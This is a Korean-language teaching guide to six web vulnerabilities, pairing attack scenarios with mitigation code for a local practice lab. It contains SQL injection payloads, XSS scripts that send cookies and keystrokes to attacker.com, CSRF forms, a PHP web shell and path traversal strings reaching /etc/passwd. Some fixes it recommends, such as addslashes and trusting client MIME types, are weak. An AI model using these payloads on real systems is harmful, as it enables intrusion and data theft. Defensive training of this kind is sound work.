# 웹 취약점 공격 시나리오 및 대응 방안

## 개요
이 문서는 웹 애플리케이션의 주요 보안 취약점들과 실제 공격 시나리오, 그리고 각각의 대응 방안을 정리한 교육용 자료입니다.

⚠️ **주의사항**: 이 문서에 포함된 모든 공격 기법은 교육 목적으로만 사용되어야 하며, 무단으로 타인의 시스템에 사용하는 것은 불법입니다.

---

## 1. SQL Injection (SQL 인젝션)

### 취약점 개요
SQL 인젝션은 웹 애플리케이션이 사용자 입력을 적절히 검증하지 않고 SQL 쿼리에 직접 삽입할 때 발생하는 취약점입니다.

### 취약한 코드 예제
```php
// sqli.php:13 - 취약한 코드
$query = "SELECT * FROM users WHERE username = '" . $_GET['username'] . "'";
```

### 공격 시나리오

#### 시나리오 1: 모든 사용자 정보 조회
**공격 입력**: `' OR '1'='1' --`
**실행되는 쿼리**: 
```sql
SELECT id, username, email, created_at FROM users WHERE username = '' OR '1'='1' --'
```
**결과**: 모든 사용자의 정보가 반환됩니다.

#### 시나리오 2: UNION 공격을 통한 데이터베이스 정보 수집
**공격 입력**: `' UNION SELECT 1,database(),version(),4 --`
**실행되는 쿼리**:
```sql
SELECT id, username, email, created_at FROM users WHERE username = '' UNION SELECT 1,database(),version(),4 --'
```
**결과**: 데이터베이스 이름과 버전 정보가 노출됩니다.

#### 시나리오 3: 테이블 구조 탐색
**공격 입력**: `' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns --`
**결과**: 데이터베이스의 모든 테이블과 컬럼 정보가 노출됩니다.

### 대응 방안

#### 1. Prepared Statement 사용 (권장)
```php
// 안전한 코드
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

#### 2. 입력값 검증 및 이스케이프
```php
// 입력값 이스케이프
$username = addslashes($_GET['username']);
// 또는 PDO::quote() 사용
$username = $pdo->quote($_GET['username']);
```

#### 3. 최소 권한 원칙
- 데이터베이스 사용자에게 필요한 최소한의 권한만 부여
- 민감한 시스템 테이블에 대한 접근 제한

---

## 2. Cross-Site Scripting (XSS)

### 취약점 개요
XSS는 웹 애플리케이션이 사용자 입력을 적절히 필터링하지 않고 브라우저에 출력할 때 발생하는 취약점입니다.

### 취약한 코드 예제
```php
// xss.php:86 - 취약한 코드
echo $entry['message']; // 사용자 입력을 필터링 없이 출력
```

### 공격 시나리오

#### 시나리오 1: 기본 스크립트 실행
**공격 입력**: `<script>alert('XSS 공격 성공!');</script>`
**결과**: 페이지 로드 시 경고창이 표시됩니다.

#### 시나리오 2: 이미지 태그를 이용한 우회
**공격 입력**: `<img src="x" onerror="alert('XSS via img tag')">`
**결과**: 존재하지 않는 이미지로 인해 onerror 이벤트가 발생하여 스크립트가 실행됩니다.

#### 시나리오 3: 쿠키 탈취 공격
**공격 입력**: 
```javascript
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```
**결과**: 사용자의 쿠키 정보가 공격자의 서버로 전송됩니다.

#### 시나리오 4: 키로거 삽입
**공격 입력**:
```javascript
<script>
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/keylog.php?key=' + e.key);
});
</script>
```
**결과**: 사용자의 키 입력이 공격자에게 전송됩니다.

### 대응 방안

#### 1. 출력 인코딩 (권장)
```php
// 안전한 코드
echo htmlspecialchars($entry['message'], ENT_QUOTES, 'UTF-8');
```

#### 2. 입력 검증 및 필터링
```php
// HTML 태그 제거
$message = strip_tags($_POST['message']);
// 또는 허용된 태그만 유지
$message = strip_tags($_POST['message'], '<b><i><u>');
```

#### 3. Content Security Policy (CSP) 헤더 설정
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

---

## 3. Cross-Site Request Forgery (CSRF)

### 취약점 개요
CSRF는 인증된 사용자가 의도하지 않은 요청을 서버에 전송하도록 하는 공격입니다.

### 공격 시나리오

#### 시나리오 1: 이메일을 통한 CSRF 공격
공격자가 피해자에게 다음과 같은 HTML이 포함된 이메일을 전송:
```html
<img src="http://vulnerable-site.com/transfer.php?to=attacker&amount=1000" width="1" height="1">
```
**결과**: 피해자가 이메일을 열면 자동으로 송금 요청이 실행됩니다.

#### 시나리오 2: 악성 웹사이트를 통한 공격
```html
<form action="http://vulnerable-site.com/change-password.php" method="POST" id="csrf-form">
    <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### 대응 방안

#### 1. CSRF 토큰 사용 (권장)
```php
// 토큰 생성
session_start();
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// 폼에 토큰 포함
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// 토큰 검증
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF 토큰이 유효하지 않습니다.');
}
```

#### 2. SameSite 쿠키 속성 설정
```php
setcookie('session_id', $session_id, [
    'samesite' => 'Strict',
    'secure' => true,
    'httponly' => true
]);
```

---

## 4. 파일 업로드 취약점

### 취약점 개요
웹 애플리케이션이 업로드되는 파일의 종류나 내용을 적절히 검증하지 않을 때 발생하는 취약점입니다.

### 공격 시나리오

#### 시나리오 1: 웹셸 업로드
**공격 파일**: `shell.php`
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
**공격 방법**: 파일을 업로드한 후 `http://site.com/uploads/shell.php?cmd=ls`로 접근
**결과**: 서버에서 임의의 명령어를 실행할 수 있습니다.

#### 시나리오 2: 확장자 우회 공격
- `shell.php.jpg` (Double Extension)
- `shell.phtml`, `shell.php5` (Alternative Extensions)
- `shell.php%00.jpg` (Null Byte Injection)

### 대응 방안

#### 1. 파일 확장자 화이트리스트
```php
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$file_extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_extension, $allowed_extensions)) {
    die('허용되지 않는 파일 형식입니다.');
}
```

#### 2. MIME 타입 검증
```php
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($_FILES['file']['type'], $allowed_types)) {
    die('허용되지 않는 파일 타입입니다.');
}
```

#### 3. 파일 내용 검증
```php
// 이미지 파일의 경우
$image_info = getimagesize($_FILES['file']['tmp_name']);
if ($image_info === false) {
    die('유효하지 않은 이미지 파일입니다.');
}
```

---

## 5. 인증 우회 (Authentication Bypass)

### 취약점 개요
부적절한 인증 로직으로 인해 정당한 자격 증명 없이 시스템에 접근할 수 있는 취약점입니다.

### 공격 시나리오

#### 시나리오 1: SQL 인젝션을 통한 로그인 우회
**입력값**:
- Username: `admin' --`
- Password: `anything`

**실행되는 쿼리**:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```
**결과**: 패스워드 검증 부분이 주석 처리되어 인증이 우회됩니다.

#### 시나리오 2: 논리적 결함을 이용한 우회
취약한 코드:
```php
if ($username == "admin" && $password == "correct_password") {
    $is_admin = true;
} else {
    $is_admin = false;
}
// 로그인 성공 여부를 잘못 판단하는 로직
if (!$is_admin == false) {  // 논리적 오류
    $_SESSION['logged_in'] = true;
}
```

### 대응 방안

#### 1. 안전한 패스워드 해싱
```php
// 회원가입 시
$hashed_password = password_hash($password, PASSWORD_DEFAULT);

// 로그인 시
if (password_verify($password, $stored_hash)) {
    // 인증 성공
}
```

#### 2. 다중 인증 요소 (2FA)
```php
// TOTP 기반 2FA 구현
$google2fa = new Google2FA();
$secret = $google2fa->generateSecretKey();
$valid = $google2fa->verifyKey($secret, $code);
```

---

## 6. 디렉토리 트래버설 (Directory Traversal)

### 취약점 개요
사용자 입력을 통해 서버의 임의 파일에 접근할 수 있는 취약점입니다.

### 공격 시나리오

#### 시나리오 1: 기본 디렉토리 트래버설
**공격 입력**: `../../../etc/passwd`
**실제 경로**: `/var/www/files/../../../etc/passwd` → `/etc/passwd`
**결과**: 시스템의 사용자 계정 정보가 노출됩니다.

#### 시나리오 2: URL 인코딩을 이용한 우회
**공격 입력**: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
**결과**: URL 디코딩 후 `../../../etc/passwd`로 해석됩니다.

#### 시나리오 3: 중첩 인코딩 우회
**공격 입력**: `....//....//....//etc/passwd`
**결과**: 필터링을 우회하여 상위 디렉토리로 이동합니다.

### 대응 방안

#### 1. 입력값 검증 및 정규화
```php
$filename = basename($_GET['file']); // 디렉토리 경로 제거
$filename = str_replace(['../', '.\\', '\\'], '', $filename); // 위험한 문자 제거
```

#### 2. 화이트리스트 방식 사용
```php
$allowed_files = ['doc1.txt', 'doc2.pdf', 'image1.jpg'];
if (in_array($_GET['file'], $allowed_files)) {
    // 파일 접근 허용
}
```

#### 3. 절대 경로 및 realpath() 사용
```php
$base_dir = '/var/www/uploads/';
$file_path = realpath($base_dir . $_GET['file']);

// base_dir 내부의 파일인지 확인
if (strpos($file_path, $base_dir) !== 0) {
    die('접근이 거부되었습니다.');
}
```

---

## 종합 보안 권장사항

### 1. 입력 검증 (Input Validation)
- 모든 사용자 입력을 신뢰하지 말 것
- 화이트리스트 방식의 검증 사용
- 정규표현식을 이용한 형식 검증

### 2. 출력 인코딩 (Output Encoding)
- 사용자 데이터 출력 시 항상 인코딩
- 컨텍스트에 맞는 인코딩 방식 사용
- HTML, URL, JavaScript 등 각각 다른 인코딩 적용

### 3. 최소 권한 원칙 (Principle of Least Privilege)
- 데이터베이스 사용자 권한 최소화
- 파일 시스템 권한 제한
- 애플리케이션 실행 권한 제한

### 4. 정기적인 보안 업데이트
- 프레임워크 및 라이브러리 최신 버전 유지
- 보안 패치 신속 적용
- 취약점 스캐닝 도구 활용

### 5. 보안 헤더 설정
```php
// 기본 보안 헤더
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
```

### 6. 로깅 및 모니터링
- 보안 이벤트 로깅
- 비정상적인 접근 패턴 감지
- 실시간 알림 시스템 구축

---

## 테스트 환경 사용법

현재 구축된 테스트 환경에서 각 취약점을 실제로 테스트해볼 수 있습니다:

1. **SQL Injection**: `http://localhost/webhacking/sqli.php`
2. **XSS**: `http://localhost/webhacking/xss.php`  
3. **CSRF**: `http://localhost/webhacking/csrf.php`
4. **File Upload**: `http://localhost/webhacking/file_upload.php`
5. **Auth Bypass**: `http://localhost/webhacking/auth_bypass.php`
6. **Directory Traversal**: `http://localhost/webhacking/directory_traversal.php`

각 페이지에는 테스트 아이디어와 힌트가 제공되어 있으니 참고하여 실습해보시기 바랍니다.

⚠️ **주의**: 이러한 취약점들은 교육 목적으로만 구현된 것이며, 실제 운영 환경에서는 절대 사용해서는 안 됩니다.